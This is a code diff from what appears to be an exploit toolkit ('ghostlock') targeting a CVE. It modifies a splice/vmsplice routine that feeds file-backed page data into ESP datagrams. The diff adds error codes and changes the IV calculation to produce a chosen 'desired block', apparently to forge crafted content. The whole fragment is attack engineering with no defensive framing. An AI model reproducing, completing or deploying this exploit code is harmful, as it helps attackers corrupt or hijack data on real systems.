@@ -210,35 +210,40 @@ namespace ghostlock::backend::cve_2026_43284::seam {
     bool RealSpliceIo::splice_one(int socket_fd, const std::uint8_t *datagram,
                                   std::size_t size, std::uint64_t offset) noexcept {
         if (datagram == nullptr || socket_fd < 0) {
+            last_error_ = 1;
             return false;
         }
         if (!io_.available()) {
+            last_error_ = 2;
             return false;
         }
         if (size < kMinDatagramBytes) {
+            last_error_ = 3;
             return false; /* Too short to hold the page: refused, not truncated. */
         }
         if (file_fd_ < 0 && !helper_.available()) {
+            last_error_ = 4;
             return false; /* No ciphertext source, so there is no datagram. */
         }
         int fds[2] = {-1, -1};
         if (io_.pipe2(fds, pipe_flags_) != 0) {
+            last_error_ = 10;
             return false;
         }
         bool sent_ok = false;
         for (;;) {
-            if (!vmsplice_all(io_, fds[1], datagram, kBeforePageBytes)) break;
+            if (!vmsplice_all(io_, fds[1], datagram, kBeforePageBytes)) { last_error_ = 20; break; }
             if (file_fd_ >= 0) {
                 std::uint64_t cursor = offset;
-                if (!splice_span(io_, file_fd_, &cursor, fds[1], kBlockBytes)) break;
+                if (!splice_span(io_, file_fd_, &cursor, fds[1], kBlockBytes)) { last_error_ = 21; break; }
             } else {
                 const long spliced = helper_.splice16(helper_.ctx, fds[1], offset);
-                if (spliced != static_cast<long>(kBlockBytes)) break;
+                if (spliced != static_cast<long>(kBlockBytes)) { last_error_ = 22; break; }
             }
             const std::size_t suffix = size - kMinDatagramBytes;
-            if (!vmsplice_all(io_, fds[1], datagram + kMinDatagramBytes, suffix)) break;
+            if (!vmsplice_all(io_, fds[1], datagram + kMinDatagramBytes, suffix)) { last_error_ = 23; break; }
             const long sent = splice_one_datagram(io_, fds[0], socket_fd, size);
-            if (sent != static_cast<long>(size)) break;
+            if (sent != static_cast<long>(size)) { last_error_ = sent < 0 ? static_cast<int>(sent) : 24; break; }
             sent_ok = true;
             break;
         }
@@ -247,9 +252,10 @@ namespace ghostlock::backend::cve_2026_43284::seam {
     }
 
     void RealSpliceIo::compute_iv(const std::uint8_t old_block[kBlockBytes],
+                                  const std::uint8_t desired_block[kBlockBytes],
                                   const std::uint8_t key[32],
                                   std::uint8_t out[kBlockBytes]) noexcept {
-        static_cast<void>(esp_iv(old_block, key, out));
+        static_cast<void>(esp_cbc_iv(old_block, desired_block, key, out));
     }
 
     void RealSpliceIo::compute_icv(const std::uint8_t *datagram, std::size_t size,
